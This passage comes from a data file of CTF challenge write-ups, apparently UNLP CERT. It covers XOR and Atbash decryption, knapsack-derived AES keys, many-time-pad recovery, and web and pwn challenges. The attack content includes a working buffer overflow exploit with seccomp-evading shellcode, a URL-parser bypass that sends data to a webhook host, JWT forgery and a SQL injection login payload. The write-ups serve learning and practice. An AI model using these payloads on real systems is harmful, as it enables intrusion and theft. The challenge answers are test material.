range(len(ciphertext)):\n\n        c = ciphertext[i]\n\n        if i == 0:\n\n            p = c ^ k0\n\n        elif i == 1:\n\n            p = c ^ k1\n\n        else:\n\n            prev_c = ciphertext[i-2]\n\n            k = k0 if i % 2 == 0 else k1\n\n            p = c ^ prev_c ^ k\n\n        plaintext.append(p)\n\n\n\n    return plaintext\n\n\n\ncipher_str = \"e5862d0ca7c344499dc31645ce8a1c0ac297491e8e904245c9ec2f4ccfd8294de5c4275dbdda234fefda295dddea0563c7f43f66\"\n\ndecrypted = decrypt_level3(cipher_str)\n\nprint(decrypted)\n\nprint(decrypted.decode('utf-8', errors='replace'))\n\n</code></pre>\n<p>Running this script yielded the following text: <code>Nice! Here is your flag: FMOK{Mzgfiv1h5zgzmh_XsfixS}</code>.</p>\n<p>--- Final Flag Transformation: Atbash Cipher ---</p>\n<p>The decrypted string <code>FMOK{Mzgfiv1h5zgzmh_XsfixS}</code> did not immediately look like a standard flag format (e.g., <code>flag{...}</code>). However, the prefix <code>FMOK</code> and the context of <code>certunlp</code> in the filename suggested a potential Atbash cipher.</p>\n<p>Applying Atbash (A<->Z, a<->z) to <code>FMOK{Mzgfiv1h5zgzmh_XsfixS}</code>:</p>\n<ul>\n<li><code>FMOK</code> became <code>UNLP</code> (Universidad Nacional de La Plata, consistent with <code>certunlp</code>).</li>\n<li><code>Mzgfiv</code> became <code>Nature</code></li>\n<li><code>1h5</code> became <code>1s5</code></li>\n<li><code>zgzmh</code> became <code>atans</code></li>\n<li><code>XsfixS</code> became <code>ChurcH</code></li>\n</ul>\n<p>Python script <code>solve_atbash.py</code>:</p>\n<pre><code class=\"python\">\ndef atbash(text):\n\n    result = \"\"\n\n    for char in text:\n\n        if 'A' &lt;= char &lt;= 'Z':\n\n            result += chr(ord('Z') - (ord(char) - ord('A')))\n\n        elif 'a' &lt;= char &lt;= 'z':\n\n            result += chr(ord('z') - (ord(char) - ord('a')))\n\n        else:\n\n            result += char\n\n    return result\n\n\n\nciphertext = \"FMOK{Mzgfiv1h5zgzmh_XsfixS}\"\n\nprint(atbash(ciphertext))\n\n</code></pre>\n<p>The fully transformed string was <code>UNLP{Nature1s5atans_ChurcH}</code>. This phrase, \"Nature is Satan's Church\", is a well-known quote from the movie \"Antichrist\" by Lars Von Trier, which is the name of the challenge, further confirming the correctness of the decryption and transformation.</p>"
            },
            {
                "id": "cidade-de-deus",
                "title": "Cidade De Deus",
                "category": "Miscellaneous",
                "tags": [],
                "writeup": "<h3>Challenge Description</h3>\n<p>The challenge provided a single file named <code>blended.txt</code>. This file contained what appeared to be lines of ASCII art text, but they were scrambled (shuffled) vertically.</p>\n<h3>Analysis</h3>\n<ol>\n<li><strong>Initial Inspection</strong>: Opening <code>blended.txt</code> revealed distinct horizontal slices of large ASCII characters (FIGlet style). Some lines clearly belonged to the top of letters (e.g., starting with <code> __</code>), while others were bottom curves (e.g., <code>\\______/</code>) or middle sections with vertical bars.</li>\n</ol>\n<ol>\n<li><strong>Reconstruction</strong>:</li>\n</ol>\n<ul>\n<li>I identified the correct vertical order of the lines by analyzing the structure of standard ASCII art fonts (specifically matching top bars, middle connections, and bottom closures).</li>\n<li>The correct permutation of the lines (0-based indices from the original file) was determined to be: <code>[2, 7, 6, 1, 0, 5, 8]</code>.</li>\n<li>Applying this reordering reconstructed a readable ASCII art banner.</li>\n</ul>\n<ol>\n<li><strong>Extraction</strong>:</li>\n</ol>\n<ul>\n<li>The reconstructed banner spelled out a sentence.</li>\n<li>By carefully reading the ASCII characters, the text was identified as: <code>UNLP{DOYOULIKEMYGRAFFITY?}</code>.</li>\n</ul>\n<ol>\n<li><strong>Flag Formulation</strong>:</li>\n</ol>\n<ul>\n<li>The text \"UNLPDOYOULIKEMYGRAFFITY?\" was formatted into the standard flag structure.</li>\n</ul>\n<h3>Solution</h3>\n<p>The final flag is: <code>UNLP{DOYOULIKEMYGRAFFITY?}</code></p>"
            },
            {
                "id": "cinefest1-local",
                "title": "Cinefest1 local",
                "category": "Miscellaneous",
                "tags": [
                    "xor",
                    "pwn",
                    "buffer",
                    "overflow",
                    "shellcode",
                    "stack",
                    "assembly",
                    "memory"
                ],
                "writeup": "<p><strong>Protections:</strong></p>\n<ul>\n<li><strong>No Canary:</strong> Stack overflows are possible.</li>\n</ul>\n<ul>\n<li><strong>No PIE:</strong> Code segments are at fixed addresses.</li>\n</ul>\n<ul>\n<li><strong>RWX Stack:</strong> The stack is executable (we can run shellcode).</li>\n</ul>\n<ul>\n<li><strong>Seccomp:</strong> A sandbox is active. It allows standard function calls but <strong>blocks <code>syscall</code> instructions if they are executed on the stack</strong>.</li>\n</ul>\n<h4>Vulnerabilities</h4>\n<p>The binary provided two distinct input stages :</p>\n<ol>\n<li><strong>Title Input:</strong> Vulnerable to a <strong>Format String Attack</strong>. It prints the user input directly using <code>printf</code>, allowing us to leak memory addresses (Stack and Libc pointers).</li>\n</ol>\n<ol>\n<li><strong>Plot Summary Input:</strong> Vulnerable to a <strong>Buffer Overflow</strong>. It reads more data than the buffer can hold, allowing us to overwrite the Return Instruction Pointer (RIP) and jump to the stack.</li>\n</ol>\n<p>---</p>\n<h4>The Exploitation Path</h4>\n<h5>1. The Strategy: \"Syscall Proxying\"</h5>\n<p>We initially tried standard shellcode (<code>open</code>/<code>read</code>/<code>write</code>), but it crashed with <code>SIGSYS</code> or <code>EOF</code>.</p>\n<ul>\n<li><strong>Diagnosis:</strong> The Seccomp filter detected that we were executing a <code>syscall</code> instruction inside the Stack memory region and killed the process.</li>\n</ul>\n<ul>\n<li><strong>Solution:</strong> We used a <strong>\"Proxy\" technique</strong>. Instead of executing the syscall ourselves, our shellcode calls the functions inside <strong>Libc</strong> (specifically <code>open</code> and <code>sendfile</code>). Since Libc is in a \"trusted\" memory region, Seccomp allows the syscall to proceed.</li>\n</ul>\n<h5>2. Leaking Addresses (Bypassing ASLR)</h5>\n<p>We needed to know _where_ the Stack was (to jump to it) and _where_ Libc was (to call its functions).</p>\n<ul>\n<li><strong>Payload:</strong> <code>%p|%p|%p|%p|%p|%p|%p|%p</code></li>\n</ul>\n<ul>\n<li><strong>Result:</strong></li>\n</ul>\n<ul>\n<li><strong>6th Leak:</strong> Stack Address (pointer to our input buffer).</li>\n</ul>\n<ul>\n<li><strong>8th Leak:</strong> Libc Base Address.</li>\n</ul>\n<ul>\n<li><strong>Calculation:</strong></li>\n</ul>\n<ul>\n<li><code>Target Buffer</code> = <code>Stack Leak</code> - 848 bytes.</li>\n</ul>\n<ul>\n<li><code>Jump Target</code> = <code>Target Buffer</code> + 32 bytes (landing inside our NOP sled).</li>\n</ul>\n<h5>3. Finding Function Addresses</h5>\n<p>We used GDB to find the absolute addresses of the functions we needed in the local Libc version:</p>\n<ul>\n<li><code>open</code>: <code>0x7ffff7e5ff20</code></li>\n</ul>\n<ul>\n<li><code>sendfile</code>: <code>0x7ffff7e60790</code></li>\n</ul>\n<h5>4. The Shellcode Logic</h5>\n<p>We wrote custom Assembly to behave like a C program function call:</p>\n<ol>\n<li><strong>Push String:</strong> Pushed <code>\"flag.txt\\x00\"</code> onto the stack.</li>\n</ol>\n<ol>\n<li><strong>Call Open:</strong> Set <code>rdi</code> to the stack pointer (filename) and performed <code>call 0x7ffff7e5ff20</code>.</li>\n</ol>\n<ol>\n<li><strong>Save FD:</strong> Saved the returned File Descriptor (RAX) into <code>r13</code>.</li>\n</ol>\n<ol>\n<li><strong>Call Sendfile:</strong> Set arguments <code>(1, fd, 0, 100)</code> and performed <code>call 0x7ffff7e60790</code>. This copies the file content directly to stdout.</li>\n</ol>\n<h5>5. Solving the \"Greedy Read\" Issue</h5>\n<p>During debugging, we realized the first input (<code>read</code>) was consuming bytes intended for the second input because we piped the file.</p>\n<ul>\n<li><strong>Fix:</strong> We padded the \"Title\" payload to exactly <strong>127 bytes</strong>. This forced the first <code>read</code> to stop exactly at the boundary, preserving our shellcode for the second <code>read</code>.</li>\n</ul>\n<p>---</p>\n<h4>The Final Local Exploit Script (<code>gen.py</code>)</h4>\n<p>This script generates the <code>exploit.in</code> file that successfully retrieves the flag locally.</p>\n<p>Python</p>\n<pre><code class=\"\">\nfrom pwn import *\n\n\n\n# 1. Addresses found via GDB Manual Debugging\n\n# ------------------------------------------------\n\nstack_leak = 0x7fffffffd690      # 6th leak from %p\n\nlibc_base  = 0x7ffff7fc6000      # 8th leak from %p\n\naddr_open  = 0x7ffff7e5ff20      # GDB: p open\n\naddr_sendfile = 0x7ffff7e60790   # GDB: p sendfile\n\n\n\n# 2. Calculations\n\n# ------------------------------------------------\n\n# Jump 32 bytes into the buffer to hit the NOP sled safely\n\njump_target = (stack_leak - 848) + 32 \n\n\n\n# 3. Shellcode: The \"Syscall Proxy\"\n\n# ------------------------------------------------\n\n# We use RCX for the 4th argument because we are calling functions, not syscalls.\n\nshellcode_src = f\"\"\"\n\n    /* Push 'flag.txt\\\\x00' */\n\n    xor rax, rax\n\n    push rax\n\n    mov rax, 0x7478742e67616c66\n\n    push rax\n\n    \n\n    /* open(rsp, 0, 0) */\n\n    mov rdi, rsp         /* arg1: filename */\n\n    xor rsi, rsi         /* arg2: flags */\n\n    xor rdx, rdx         /* arg3: mode */\n\n    mov r12, {addr_open}\n\n    call r12\n\n    mov r13, rax         /* Save FD */\n\n\n\n    /* sendfile(1, fd, 0, 100) */\n\n    mov rdi, 1           /* arg1: stdout */\n\n    mov rsi, r13         /* arg2: fd */\n\n    xor rdx, rdx         /* arg3: offset */\n\n    mov rcx, 100         /* arg4: count */\n\n    mov r12, {addr_sendfile}\n\n    call r12\n\n    \n\n    /* Infinite loop to prevent crash */\n\n    jmp $\n\n\"\"\"\n\n\n\ncontext.arch = 'amd64'\n\nshellcode = asm(shellcode_src)\n\n\n\n# 4. Construct Payload\n\n# ------------------------------------------------\n\n# Pad Input 1 to 127 bytes to handle the greedy read()\n\nfmt_str = b'%p|' * 8\n\npad_1   = b'.' * (127 - len(fmt_str))\n\ninput_1 = fmt_str + pad_1\n\n\n\n# Exploit Buffer\n\nnop_sled = b'\\x90' * 64\n\npadding  = b'A' * (280 - len(nop_sled) - len(shellcode))\n\nexploit  = nop_sled + shellcode + padding + p64(jump_target)\n\n\n\n# Combine\n\nfull_payload = input_1 + exploit\n\n\n\n# Save\n\nwith open('exploit.in', 'wb') as f:\n\n    f.write(full_payload)\n\n\n\nprint(f\"[+] Local exploit generated. Target: {hex(jump_target)}\")\n\n</code></pre>\n<h4>Execution</h4>\n<ol>\n<li>Run <code>python3 gen.py</code>.</li>\n</ol>\n<ol>\n<li>Run <code>gdb ./director_easy</code>.</li>\n</ol>\n<ol>\n<li>Inside GDB: <code>run &lt; exploit.in</code>.</li>\n</ol>\n<ol>\n<li><strong>Result:</strong> <code>UNLP{fakeflag}</code> printed to stdout!</li>\n</ol>"
            },
            {
                "id": "dexter",
                "title": "Dexter",
                "category": "Web Exploitation",
                "tags": [
                    "flask",
                    "jwt"
                ],
                "writeup": "<p>The challenge \"dexter\" involved a Flask application using JWT for authentication. The vulnerability lay in the weak generation of the <code>secret_key</code>. The key was generated using <code>random.randint</code> seeded with a value that itself came from <code>random.randint(0, 2000)</code>. This effectively reduced the possible key space to only 2001 possibilities, making it trivial to brute-force.</p>\n<p>I solved the challenge by:</p>\n<ol>\n<li><strong>Analyzing the Source Code:</strong> I identified the weak seed generation logic in <code>app.py</code>.</li>\n<li><strong>Fetching a Valid Token:</strong> I made a request to the server to obtain a valid JWT signed with the active secret key.</li>\n<li><strong>Brute-Forcing the Key:</strong> I wrote a Python script to iterate through all 2001 possible seeds, generating the corresponding keys and attempting to verify the server's token.</li>\n<li><strong>Forging a Token:</strong> Once the correct key (<code>Rem1xKey86426418499</code>) was found, I forged a new JWT with the payload <code>{\"role\": \"superuser\", \"user\": \"admin\"}</code>.</li>\n<li><strong>Retrieving the Flag:</strong> I used the forged token to authenticate with the server and retrieve the flag.</li>\n</ol>\n<p><strong>Flag:</strong> `UNLP{R34llY-ur-Us1ng-Ai_for_th1s-B4by-Ch4ll3ng3?}</p>"
            },
            {
                "id": "el-angel-exterminador",
                "title": "El angel exterminador",
                "category": "Cryptography",
                "tags": [
                    "xor",
                    "image"
                ],
                "writeup": "<p><strong>Challenge Description:</strong> The challenge presented a file named <code>flag.png.xor</code>, suggesting an XOR encryption. The objective was to decrypt this file to obtain the flag.</p>\n<p><strong>Solution Steps:</strong></p>\n<ol>\n<li><strong>Initial Analysis:</strong></li>\n</ol>\n<p>The presence of the <code>.xor</code> extension indicated a likely XOR encryption. The original file was presumed to be <code>flag.png</code>.</p>\n<ol>\n<li><strong>Identifying PNG Signature:</strong></li>\n</ol>\n<p>PNG files have a standard 8-byte signature: <code>89 50 4E 47 0D 0A 1A 0A</code>. This knowledge is crucial for a known-plaintext attack.</p>\n<ol>\n<li><strong>Inspecting the Encrypted File:</strong></li>\n</ol>\n<p>The first 32 bytes of <code>flag.png.xor</code> were extracted using <code>xxd</code>:     <code>dc 1e 02 17 3f 3a 28 3f 21 55 4e 41 19 7a 74 60 35 21 54 62 4c 50 33 f2 3a 37 21 55 4e 96 01 51</code></p>\n<ol>\n<li><strong>XOR Key Derivation (Known-Plaintext Attack):</strong></li>\n</ol>\n<p>By XORing the first 8 bytes of <code>flag.png.xor</code> with the PNG signature, the initial part of the XOR key was revealed:     <code>dc ^ 89 = 55 ('U')</code>     <code>1e ^ 50 = 4e ('N')</code>     <code>02 ^ 4e = 4c ('L')</code>     <code>17 ^ 47 = 50 ('P')</code>     <code>3f ^ 0d = 32 ('2')</code>     <code>3a ^ 0a = 30 ('0')</code>     <code>28 ^ 1a = 32 ('2')</code>     <code>3f ^ 0a = 35 ('5')</code>     This resulted in <code>UNLP2025</code>.</p>\n<p>Further analysis of the subsequent bytes, specifically the expected <code>IHDR</code> chunk type (<code>49 48 44 52</code>) after the PNG signature, helped confirm and extend the key. The pattern <code>UNLP2025</code> followed by <code>!</code> and then a repeat of <code>UNLP202</code> strongly suggested the key was <code>UNLP2025!</code>.</p>\n<ol>\n<li><strong>Decryption Script:</strong></li>\n</ol>\n<p>A Python script (<code>decrypt.py</code>) was created to perform the XOR decryption:</p>\n<p>```python     def xor_decrypt(input_path, output_path, key):         with open(input_path, 'rb') as f_in, open(output_path, 'wb') as f_out:             data = f_in.read()             key_len = len(key)             decrypted_data = bytearray()</p>\n<p>for i in range(len(data)):                 decrypted_data.append(data[i] ^ key[i % key_len])</p>\n<p>f_out.write(decrypted_data)</p>\n<p>if __name__ == \"__main__\":         key = b\"UNLP2025!\" # Derived key         xor_decrypt(\"flag.png.xor\", \"flag.png\", key)         print(\"Decryption complete. Saved to flag.png\")     ```</p>\n<ol>\n<li><strong>Executing the Decryption:</strong></li>\n</ol>\n<p>The script was executed, successfully creating <code>flag.png</code>.</p>\n<ol>\n<li><strong>Verification:</strong></li>\n</ol>\n<p>The <code>file</code> command confirmed that <code>flag.png</code> was a valid PNG image:     <code>flag.png: PNG image data, 300 x 450, 8-bit/color RGB, non-interlaced</code></p>\n<ol>\n<li><strong>Flag Retrieval:</strong></li>\n</ol>\n<p>The decrypted <code>flag.png</code> image, when opened, revealed the flag visually.</p>\n<p><strong>The Flag:</strong> <code>UNLP{f4th3r0fsurrealism!}</code></p>"
            },
            {
                "id": "final-cut",
                "title": "Final Cut",
                "category": "Reverse Engineering",
                "tags": [
                    "crypto",
                    "aes",
                    "cipher",
                    "buffer",
                    "ghidra"
                ],
                "writeup": "<h3>Overview</h3>\n<p>The challenge provided a 64-bit ELF binary <code>final_cut</code>. When executed, it displayed a \"Rendering\" message and attempted to calculate an \"Optimal Cut Score\" before hanging indefinitely. The goal was to recover the flag, which was encrypted within the binary.</p>\n<h3>Analysis</h3>\n<h4>Static Analysis</h4>\n<p>Using <code>file</code> and <code>strings</code>, we identified it as a standard Linux executable. Strings like \"AES-128 Decryption Projector\", \"Projector Malfunction: Key Error\", and \"Calculating optimal cut\" suggested that the program was performing a calculation to derive a decryption key.</p>\n<p>Disassembling with <code>objdump</code> (or using a decompiler like Ghidra/IDA) revealed the main logic:</p>\n<ol>\n<li><strong>Data loading</strong>: The program loads two arrays of integers from the <code>.rodata</code> section. These correspond to \"weights\" (runtime) and \"values\" (scene score).</li>\n<li><strong>Knapsack Problem</strong>: The \"Calculating optimal cut\" phase implements a recursive solution to the 0/1 Knapsack Problem.</li>\n</ol>\n<ul>\n<li>Capacity (Max Runtime): 240</li>\n<li>Number of items (Scenes): 100</li>\n<li>The recursive implementation has exponential time complexity O(2^n), causing the program to hang.</li>\n</ul>\n<ol>\n<li><strong>Key Generation</strong>: The result of this calculation (the optimal score) is used to construct an AES-128 key.</li>\n</ol>\n<ul>\n<li>The key buffer is 16 bytes initialized to zero.</li>\n<li>The 64-bit integer result is written to the first 8 bytes (little-endian).</li>\n</ul>\n<ol>\n<li><strong>Decryption</strong>: The binary uses OpenSSL's <code>AES_decrypt</code> (ECB mode) to decrypt a stored blob of data using the generated key.</li>\n</ol>\n<h4>Extraction</h4>\n<p>We identified the offsets for the relevant data structures in the binary:</p>\n<ul>\n<li><strong>Weights Array</strong>: Offset <code>0x2020</code> (Size: 100 integers)</li>\n<li><strong>Values Array</strong>: Offset <code>0x21C0</code> (Size: 100 integers)</li>\n<li><strong>Encrypted Flag</strong>: Offset <code>0x2360</code> (Size: 48 bytes)</li>\n</ul>\n<h3>Solution</h3>\n<p>Instead of waiting for the slow recursive algorithm to finish, we implemented the Knapsack solver using Dynamic Programming (DP). This reduces the complexity to O(n * W), which runs instantly.</p>\n<h4>Script (<code>solve.py</code>)</h4>\n<pre><code class=\"python\">\nimport struct\n\nfrom Crypto.Cipher import AES\n\n\n\ndef solve():\n\n    with open('final_cut', 'rb') as f:\n\n        # Extract Weights\n\n        f.seek(0x2020)\n\n        weights_data = f.read(400) # 100 integers * 4 bytes\n\n        weights = struct.unpack('&lt;100i', weights_data)\n\n\n\n        # Extract Values\n\n        f.seek(0x21C0)\n\n        values_data = f.read(400)\n\n        values = struct.unpack('&lt;100i', values_data)\n\n                                                                                                    # Extract Encrypted Flag                                                                    f.seek(0x2360)\n\n        encrypted_flag = f.read(48)\n\n\n\n    capacity = 240                                                                              n = 100\n\n\n\n    # Knapsack Dynamic Programming Solution\n\n    # dp[w] = max value with capacity w\n\n    dp = [0] * (capacity + 1)\n\n\n\n    for i in range(n):\n\n        w = weights[i]\n\n        v = values[i]                                                                               for j in range(capacity, w - 1, -1):                                                            dp[j] = max(dp[j], dp[j-w] + v)\n\n    optimal_score = dp[capacity]\n\n    print(f\"Optimal Score: {optimal_score}\")\n\n\n\n    # Construct Key\n\n    # Key is 16 bytes: [Score (8 bytes)][Zero Padding (8 bytes)]\n\n    key = struct.pack('&lt;Q', optimal_score) + b'\\x00' * 8\n\n\n\n    print(f\"Key (hex): {key.hex()}\")\n\n\n\n    # Decrypt\n\n    try:                                                                                            cipher = AES.new(key, AES.MODE_ECB)                                                         decrypted = cipher.decrypt(encrypted_flag)                                                  print(f\"Decrypted: {decrypted.decode('utf-8', errors='ignore')}\")\n\n    except Exception as e:\n\n        print(f\"Decryption failed: {e}\")                                                                                                                                                if __name__ == \"__main__\":\n\n    solve()\n\n</code></pre>\n<h3>Result</h3>\n<p>Running the script yields the optimal score and decrypts the flag:</p>\n<ul>\n<li><strong>Optimal Score</strong>: <code>17452999</code></li>\n<li><strong>Key</strong>: <code>c74f0a01000000000000000000000000</code></li>\n<li><strong>Flag</strong>: <code>UNLP{DyNam1C_Pr0gRamm1nG_w1Ns_0sC4rs}</code></li>\n</ul>"
            },
            {
                "id": "fragmented-flags",
                "title": "Fragmented Flags",
                "category": "Miscellaneous",
                "tags": [
                    "web"
                ],
                "writeup": "<p>The flag was fragmented into three parts and hidden in different files on the website.</p>\n<ol>\n<li><strong>First Fragment: <code>UNLP{1_dOnt_like_</code></strong></li>\n</ol>\n<ul>\n<li><strong>Location:</strong> Found in the <code>index.html</code> file's <code>&lt;meta name=\"description\" ...&gt;</code> tag.</li>\n<li><strong>Discovery Method:</strong> Retrieved the <code>index.html</code> content using <code>curl</code> and inspected the source.</li>\n</ul>\n<ol>\n<li><strong>Second Fragment: <code>the_TEG_map_|_prefer_</code></strong></li>\n</ol>\n<ul>\n<li><strong>Location:</strong> Hidden within a CSS comment in the <code>style.css</code> file.</li>\n<li><strong>Discovery Method:</strong> Identified <code>style.css</code> as a linked resource in <code>index.html</code>, then fetched its content using <code>curl</code> and examined the file.</li>\n</ul>\n<ol>\n<li><strong>Third Fragment: <code>the_Bor3d_Grid}</code></strong></li>\n</ol>\n<ul>\n<li><strong>Location:</strong> Found directly in the <code>main.js</code> file.</li>\n<li><strong>Discovery Method:</strong> Identified <code>main.js</code> as a linked resource in <code>index.html</code>, then fetched its content using <code>curl</code> and found the fragment.</li>\n</ul>\n<p><strong>Full Flag:</strong> Combining all three fragments yields the complete flag: <code>UNLP{1_dOnt_like_the_TEG_map_|_prefer_the_Bor3d_Grid}</code></p>"
            },
            {
                "id": "irreversible",
                "title": "Irreversible",
                "category": "Web Exploitation",
                "tags": [
                    "web",
                    "http"
                ],
                "writeup": "<h3>Vulnerability Analysis</h3>\n<p>The core logic resides in <code>app.py</code>. The application allows users to specify a <code>domain</code> to send the flag to, but it enforces a strict check:</p>\n<pre><code class=\"python\">\nALLOWED_DOMAIN = \"https://ctf.cert.unlp.edu.ar\"\n\n...\n\ntarget_domain = request.form.get('domain', '')\n\nif not target_domain.startswith(ALLOWED_DOMAIN):\n\n    return jsonify({\"error\": \"Invalid URL\"}), 400\n\n</code></pre>\n<p>If the check passes, the application sends a POST request containing the flag:</p>\n<pre><code class=\"python\">\nrequests.post(\n\n    f\"{url}/irreversible_receiver\",\n\n    ...\n\n    headers={\"Flag\": flag}\n\n)\n\n</code></pre>\n<h4>The Exploit</h4>\n<p>The <code>startswith</code> check is insufficient because standard URL parsing (and the Python <code>requests</code> library) supports <strong>Basic Authentication</strong> in the format <code>scheme://user:password@host</code>.</p>\n<p>We can construct a URL that satisfies the <code>startswith</code> check but directs the traffic to a server we control: <code>https://ctf.cert.unlp.edu.ar@our-webhook.com</code></p>\n<p>In this URL:                                                                                - <code>https://</code> is the scheme.                                                                 - <code>ctf.cert.unlp.edu.ar</code> is interpreted as the <strong>username</strong>.</p>\n<ul>\n<li><code>@</code> acts as the delimiter.</li>\n<li><code>our-webhook.com</code> is the actual <strong>destination host</strong>.</li>\n</ul>\n<h3>Exploitation Steps</h3>\n<ol>\n<li><strong>Setup a Listener:</strong></li>\n</ol>\n<p>We need a public endpoint to receive the HTTP request. Services like <code>webhook.site</code> or <code>requestcatcher.com</code> work perfectly for this. Let's assume our webhook URL is <code>https://webhook.site/UUID</code>.</p>\n<ol>\n<li><strong>Bypass ReCaptcha:</strong></li>\n</ol>\n<p>The remote server implements Google ReCaptcha. Since the ReCaptcha token is tied to the solver's session/IP, we cannot easily use <code>curl</code> from a different machine/server. The easiest way is to execute the exploit directly in the browser's developer console after solving the captcha manually.</p>\n<ol>\n<li><strong>Execution:</strong></li>\n</ol>\n<ul>\n<li>Open the challenge URL (<code>https://flagsender.ctf.cert.unlp.edu.ar/</code>) in a browser.</li>\n<li>Open Developer Tools (F12) and go to the Console tab.                                     - <strong>Solve the ReCaptcha</strong> on the page (click the checkbox).                                 - <strong>Immediately</strong> run the following JavaScript code in the console:</li>\n</ul>\n<p>```javascript     // Get the fresh token from the just-solved captcha               const token = grecaptcha.getResponse();</p>\n<p>// Construct the malicious payload     // Format: https://ctf.cert.unlp.edu.ar @ YOUR_WEBHOOK     const attackerUrl = \"https://ctf.cert.unlp.edu.ar@webhook.site/YOUR-UUID-HERE\";</p>\n<p>const formData = new FormData();     formData.append(\"domain\", attackerUrl);     formData.append(\"g-recaptcha-response\", token);</p>\n<p>// Send the request     fetch(\"/send_flag\", {method: \"POST\",body: formData})     .then(r => r.json()).then(console.log)     .catch(console.error);     ```</p>\n<ol>\n<li><strong>Retrieve Flag:</strong></li>\n</ol>\n<p>Check the webhook listener. A POST request will arrive with the flag in the HTTP Headers.                                                                                                                                    <strong>Header:</strong> <code>Flag: UNLP{ohH-bYp4ss-UrLP4rs3rs-1s-My-p4Ss10n}</code></p>\n<h3>Flag:<code>UNLP{ohH-bYp4ss-UrLP4rs3rs-1s-My-p4Ss10n}</code></h3>"
            },
            {
                "id": "mandatory-zelda-challenge",
                "title": "Mandatory Zelda Challenge",
                "category": "Miscellaneous",
                "tags": [],
                "writeup": "<p>Second part can be found from git commit history</p>\n<p>YeArz_th1s_Gam3_R0ckz!!!}</p>\n<p>First part can be found from waybackmachine UNLP{Ev3n_4Fter_34_</p>\n<h3>Flag: <code>UNLP{Ev3n_4Fter_34_YeArz_th1s_Gam3_R0ckz!!!}</code></h3>"
            },
            {
                "id": "manhattan",
                "title": "Manhattan",
                "category": "Beginner",
                "tags": [],
                "writeup": "<p>Just use strings UNLP{St3g4n0graphy_15_fUn}</p>"
            },
            {
                "id": "parasite",
                "title": "Parasite",
                "category": "Cryptography",
                "tags": [
                    "cipher",
                    "xor",
                    "rop"
                ],
                "writeup": "<h3>Challenge Description</h3>\n<p>We are provided with a file <code>mtp.txt</code> containing 10 lines of hex-encoded strings. The title \"Parasite\" and the file name <code>mtp.txt</code> strongly suggest a <strong>Many Time Pad</strong> attack on a stream cipher (like OTP where the key is reused).</p>\n<h3>Analysis</h3>\n<p>In a stream cipher, encryption is performed by XORing the plaintext ($P$) with a key ($K$): $$C = P \\oplus K$$</p>\n<p>If the key is reused for multiple messages (as implied by \"MTP\"), we have: $$C_1 = P_1 \\oplus K$$ $$C_2 = P_2 \\oplus K$$</p>\n<p>XORing two ciphertexts eliminates the key: $$C_1 \\oplus C_2 = (P_1 \\oplus K) \\oplus (P_2 \\oplus K) = P_1 \\oplus P_2$$</p>\n<p>The result is the XOR sum of the two plaintexts. Since the plaintexts are English text (likely ASCII), we can exploit statistical properties to recover them. For example, the space character (<code>0x20</code>) is very frequent. If $P_1$ has a space at index $i$, then: $$(C_1 \\oplus C_2)[i] = \\text{space} \\oplus P_2[i] = 0x20 \\oplus P_2[i]$$ XORing an ASCII letter with <code>0x20</code> typically flips its case. This allows us to identify probable spaces and recover the corresponding characters in other messages.</p>\n<h3>Solution Steps</h3>\n<ol>\n<li><strong>Initial Data Extraction</strong>: We read the hex-encoded lines from <code>mtp.txt</code>.</li>\n<li><strong>Automated Analysis</strong>: We wrote a script (<code>solve_best.py</code>) that implements a beam search algorithm.</li>\n</ol>\n<ul>\n<li>It iterates through each byte position.</li>\n<li>For each position, it tries all possible key bytes (0x00-0xFF).</li>\n<li>It decrypts that byte for all 10 messages.</li>\n<li>It scores the \"validity\" of the decrypted characters based on English letter frequency and printable ASCII range.</li>\n<li>The algorithm keeps the \"best\" partial keys and extends them.</li>\n</ul>\n<ol>\n<li><strong>Partial Key Recovery</strong>: The script successfully recovered the beginning of the key: <code>554e4c507b...</code> which decodes to <code>UNLP{</code>. This confirms the key is the flag itself.</li>\n<li><strong>Contextual Refinement</strong>:</li>\n</ol>\n<ul>\n<li>The recovered text fragments looked like dialogue.</li>\n<li>Msg 0: <code>You know what kind of plan n...</code></li>\n<li>Msg 1: <code> No plan at all. You know w...</code></li>\n<li>Searching these phrases online identified them as quotes from the movie <strong>Parasite</strong> (specifically the father's monologue about \"no plan\").</li>\n</ul>\n<ol>\n<li><strong>Completing the Flag</strong>:</li>\n</ol>\n<ul>\n<li>The recovered text fragments looked like dialogue.</li>\n<li>We continued to refine the key by guessing the next words in the famous monologue (\"Because life cannot be planned\", \"sleeping together on the floor\", etc.).</li>\n<li>We used a script <code>test_key.py</code> to test our guesses for the flag (Key).</li>\n<li>The guess <code>UNLP{we_4llLiv3inTheS4m3CountryCall3dCapitalism}</code> resulted in perfectly readable text for all 10 lines.</li>\n</ul>\n<h3>Recovered Messages</h3>\n<ol>\n<li><code>You know what kind of plan never fails? No plan.</code></li>\n<li><code> No plan at all. You know why? Because life cann</code></li>\n<li><code>ot be planned. Look around you. Did you think th</code></li>\n<li><code>ese people made a plan to sleep in the sports ha</code></li>\n<li><code>ll with you? But here we are now, sleeping toget</code></li>\n<li><code>her on the floor. So, there's no need for a plan</code></li>\n<li><code>. You can't go wrong with no plans. We don't nee</code></li>\n<li><code>d to make a plan for anything. It doesn't matter</code></li>\n<li><code> what will happen next. Even if the country gets</code></li>\n<li><code> destroyed or sold out, nobody cares. Got it?</code></li>\n</ol>\n<h3>Final Flag</h3>\n<p><code>UNLP{we_4llLiv3inTheS4m3CountryCall3dCapitalism}</code></p>"
            },
            {
                "id": "tron",
                "title": "TRON",
                "category": "Beginner",
                "tags": [
                    "sql"
                ],
                "writeup": "<p>login to the page using username as ' OR 1=1--</p>\n<p>Flag: UNLP{W3lc0m3_t0_SQL1_C7F!}</p>"
            },
            {
                "id": "titanic",
                "title": "Titanic",
                "category": "Beginner",
                "tags": [
                    "aes",
                    "http",
                    "reverse"
                ],
